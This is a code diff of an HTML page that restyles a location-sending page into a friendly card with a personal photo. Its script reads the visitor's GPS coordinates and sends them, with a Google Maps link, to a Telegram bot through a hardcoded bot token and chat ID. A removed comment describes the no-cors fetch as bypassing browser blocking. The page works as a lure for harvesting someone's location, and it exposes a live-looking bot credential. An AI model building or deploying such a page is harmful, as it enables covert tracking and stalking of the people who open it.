@@ -3,20 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GPS Sender</title>
+    <title>Геолокация</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; padding: 20px; }
-        h2 { color: #4CAF50; }
-        #status { padding: 20px; font-size: 18px; margin-top: 10px; }
-        button { background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 20px; }
-        button:active { background-color: #45a049; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #fdf6ec 0%, #f5e6d3 100%);
+            color: #4a3728;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background: #fffaf3;
+            border: 1px solid #ebd9c3;
+            border-radius: 24px;
+            padding: 28px 24px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(139, 94, 52, 0.12);
+        }
+        .photo-wrapper {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            padding: 5px;
+            background: linear-gradient(135deg, #e07a5f, #f2cc8f);
+            box-shadow: 0 6px 16px rgba(224, 122, 95, 0.25);
+        }
+        .photo-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+            display: block;
+            background-color: #f3e5d8;
+        }
+        h2 {
+            color: #8c4a27;
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        #status {
+            color: #6e5543;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        button {
+            background: linear-gradient(135deg, #d96b43 0%, #c8553d 100%);
+            color: #fffaf3;
+            border: none;
+            padding: 15px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 14px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 6px 15px rgba(200, 85, 61, 0.28);
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+        }
+        button:active {
+            transform: scale(0.98);
+            box-shadow: 0 3px 8px rgba(200, 85, 61, 0.2);
+        }
     </style>
 </head>
 <body>
-    <h2 id="title">Требуется подтверждение</h2>
-    <div id="status">Нажмите кнопку ниже, чтобы передать координаты.</div>
-    
-    <button id="geoBtn" onclick="getLocation()">Начать определение</button>
+
+    <div class="card">
+        <!-- Ваша фотография -->
+        <div class="photo-wrapper">
+            <img src="photo.jpg" alt="Фото" onerror="this.style.display='none'">
+        </div>
+
+        <h2 id="title">Проверка геопозиции</h2>
+        <div id="status">Нажмите кнопку ниже, чтобы отправить текущие координаты.</div>
+        
+        <button id="geoBtn" onclick="getLocation()">Отправить геопозицию</button>
+    </div>
 
     <script>
         const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
@@ -42,15 +116,12 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    // Исправлено имя переменной на mapsLink
                     const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;
 
                     statusDiv.innerText = "Координаты получены, отправляем...";
 
                     const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
                     
-                    // Отправка через fetch с режимом no-cors обходит блокировку браузера
                     fetch(url, { mode: "no-cors" })
                         .then(() => {
                             titleH2.innerText = "Отправлено! ✔️";
@@ -67,10 +138,10 @@
                     let errorMsg = "";
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg = "Доступ запрещен. Разрешите геолокацию в настройках сайта (значок замка в адресной строке).";
+                            errorMsg = "Доступ запрещен. Разрешите геолокацию в настройках сайта.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Местоположение недоступно. Проверьте, включен ли GPS в шторке телефона.";
+                            errorMsg = "Местоположение недоступно. Проверьте, включен ли GPS.";
                             break;
                         case error.TIMEOUT:
                             errorMsg = "Время ожидания истекло. Попробуйте еще раз.";
